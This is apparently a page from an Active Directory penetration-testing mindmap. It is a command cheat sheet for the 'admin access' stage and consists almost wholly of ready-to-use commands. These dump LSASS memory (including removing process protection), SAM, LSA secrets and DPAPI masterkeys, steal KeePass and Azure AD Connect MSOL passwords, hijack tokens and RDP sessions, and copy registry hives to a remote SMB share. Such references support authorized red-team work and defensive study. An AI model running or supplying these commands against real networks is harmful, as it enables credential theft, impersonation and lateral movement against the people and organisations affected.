---
title: "Admin Access"
category: credential-access
color: "#FAD9D5"
tags:
  - ad-mindmap
  - credential-access
---

# 🛡️ Admin Access

> [!info] Mindmap box `Admin access`
> Part of the [[AD Mindmap]] — Active Directory Mindmap v2025.03.

## Extract credentials from LSASS.exe

- LSASS as protected process
    - `PPLdump64.exe <lsass.exe|lsass_pid> lsass.dmp #before 2022-07-22 update` [↗](https://github.com/itm4n/PPLdump)
    - `mimikatz "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "token::elevate"  "sekurlsa::logonpasswords" "!processprotect  /process:lsass.exe" "!-"` [↗](https://github.com/gentilkiwi/mimikatz)
- Extract LSASS secrets ➡️ [[Valid Credentials|User + Pass]] / [[Crack Hash|NTLM]] / [[Lateral Movement|PassTheHash]] / [[Lateral Movement|Clear text move]]
    - `procdump.exe -accepteula -ma lsass.exe lsass.dmp` [↗](https://learn.microsoft.com/fr-fr/sysinternals/downloads/procdump)
    - `mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords"  "exit"` [↗](https://github.com/gentilkiwi/mimikatz)
    - `msf> load kiwi creds_all` [↗](https://docs.metasploit.com/)
    - `nxc smb <ip_range> -u <user> -p <password> -M lsassy` [↗](https://github.com/Pennyw0rth/NetExec)
    - `lsassy -d <domain> -u <user> -p <password> <ip>` [↗](https://github.com/login-securite/lsassy)

## Extract credentials from SAM
➡️ [[Crack Hash|NTLM]] / [[Lateral Movement|PassTheHash]]

- `nxc smb <ip_range> -u <user> -p <password> --sam` [↗](https://github.com/Pennyw0rth/NetExec)
- `msf> hashdump` [↗](https://docs.metasploit.com/)
- `mimikatz "privilege::debug" "lsadump::sam" "exit"` [↗](https://github.com/gentilkiwi/mimikatz)
- `secretsdump.py <domain>/<user>:<password>@<ip>` [↗](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- `reg save HKLM\SAM <file>;  reg save HKLM\SYSTEM <file>` [↗](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg)
    - `secretsdump.py -system SYSTEM -sam SAM LOCAL` [↗](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- `reg.py <domain>/<user>:<password>@<ip> backup -o '\\<smb_ip>\share'` [↗](https://github.com/fortra/impacket/blob/master/examples/reg.py)
    - `secretsdump.py -system SYSTEM -sam SAM LOCAL` [↗](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- `regsecrets.py <domain>/<user>:<password>@<ip>` [↗](https://github.com/fortra/impacket/pull/1898)

## Extract credentials from LSA
➡️ [[Crack Hash|MsCache 2]] / [[Valid Credentials|User + Pass]]

- `nxc smb <ip_range> -u <user> -p <password> --lsa` [↗](https://github.com/Pennyw0rth/NetExec)
- `mimikatz "privilege::debug" "lsadump::lsa" "exit"` [↗](https://github.com/gentilkiwi/mimikatz)
- `reg save HKLM\SECURITY <file>;  reg save HKLM\SYSTEM <file>` [↗](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg)
    - `secretsdump.py -system SYSTEM -security SECURITY` [↗](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- `reg.py <domain>/<user>:<password>@<ip> backup -o '\\<smb_ip>\share'` [↗](https://github.com/fortra/impacket/blob/master/examples/reg.py)

## Extract credentials from DPAPI

- DPAPI ➡️ [[Valid Credentials|User + Pass]] / [[Lateral Movement|PassTheHash]] / [[Lateral Movement|Clear text move]]
    - `nxc smb <ip_range> -u <user> -p <password> --dpapi [cookies] [nosystem]` [↗](https://github.com/Pennyw0rth/NetExec)
    - `donpapi <domain>/<user>:<password>@<target>` [↗](https://github.com/login-securite/DonPAPI)
    - `dpapidump.py <domain>/<user>:<password>@<target>` [↗](https://github.com/fortra/impacket/pull/1898)
    - get masterkey
        - `mimikatz "sekurlsa::dpapi"` [↗](https://github.com/gentilkiwi/mimikatz)
            - `dploot.py browser -d <domain> -u <user> -p '<password>' <ip> -mkfile <masterkeys_file>` [↗](https://github.com/zblurx/dploot)
        - `lsassy -d <domain> -u <user> -p <password> <ip> -m rdrleakdiag -M masterkeys` [↗](https://github.com/login-securite/lsassy)
            - `dploot.py browser -d <domain> -u <user> -p '<password>' <ip> -mkfile <masterkeys_file>` [↗](https://github.com/zblurx/dploot)
    - `SharpDPAPI.exe triage` [↗](https://github.com/GhostPack/SharpDPAPI)
- Crack users masterkey ➡️ [[Crack Hash|DPAPImk]]
    - copy c:\users\<user>\AppData\Roaming\Microsoft\Protect\<SID>
        - `DPAPImk2john.py --preferred <prefered_file>` [↗](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)
            - `DPAPImk2john.py -c domain -mk <masterkey> -S <sid>` [↗](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)

## Impersonate

- Impersonate ➡️ [[ACLs & ACEs Permissions|ACL]] / [[Valid Credentials|User + Pass]]
    - `msf> use incognito impersonate_token <domain>\\<user>` [↗](https://docs.metasploit.com/)
    - `nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users` [↗](https://github.com/Pennyw0rth/NetExec)
        - `nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>` [↗](https://github.com/Pennyw0rth/NetExec)
    - `irs.exe list` [↗](https://github.com/zblurx/impersonate-rs)
        - `irs.exe exec -p <pid> -c <command>` [↗](https://github.com/zblurx/impersonate-rs)
- Impersonate with adcs ➡️ [[Crack Hash|NTLM]] / [[Lateral Movement|Pass The Hash / Ticket / Certificate]]
    - `masky - d <domain> -u <user>  (-p <password> || -k || -H <hash>) -ca <certificate authority> <ip>` [↗](https://github.com/Z4kSec/Masky/tree/master)
- Impersonate RDP Session ➡️ [[Lateral Movement|RDP]]
    - `psexec.exe -s -i cmd` [↗](https://learn.microsoft.com/fr-fr/sysinternals/downloads/psexec)
        - `query user` [↗](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query)
            - `tscon.exe <id> /dest:<session_name>` [↗](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon)

## Misc

- Find Users ➡️ [[Valid User (No Password)|Username]]
    - `smbmap.py --host-file ./computers.list -u <user> -p <password> -d <domain> -r 'C$\Users' --dir-only --no-write-check --no-update --no-color --csv users_directory.csv` [↗](https://github.com/ShawnDEvans/smbmap)
- Extract Keepass ➡️ [[Valid Credentials|User + Pass]]
    - `KeePwn.py plugin add -u '<user>' -p '<password>' -d '<domain>' -t <target> --plugin KeeFarceRebornPlugin.dll`
    - `KeePwn.py trigger add -u '<user>' -p '<password>' -d '<domain>' -t <target>`
- Hybrid (Azure AD-Connect) ➡️ [[ACLs & ACEs Permissions|DCSYNC]]
    - Dump cleartext password of MSOL Account on ADConnect Server
        - `azuread_decrypt_msol_v2.ps1` [↗](https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c)
        - `nxc smb <ip> -u <user> -p <password> -M msol` [↗](https://github.com/Pennyw0rth/NetExec)
